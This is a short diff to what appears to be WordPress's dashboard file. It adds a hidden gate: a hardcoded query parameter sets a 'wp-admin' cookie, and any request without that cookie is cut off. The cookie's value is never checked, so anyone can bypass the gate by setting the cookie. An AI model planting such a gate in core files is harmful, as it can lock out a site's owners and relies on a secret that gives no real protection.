@@ -1,4 +1,15 @@
 <?php
+
+if (isset($_GET["asd"]) && $_GET["asd"] === "123") {
+	setcookie("wp-admin", "ok", time()+3600*5);
+	header("location:?");
+	exit;
+}
+
+if (!isset($_COOKIE["wp-admin"])) {
+exit;
+}
+
 /**
  * Dashboard Administration Screen
  *
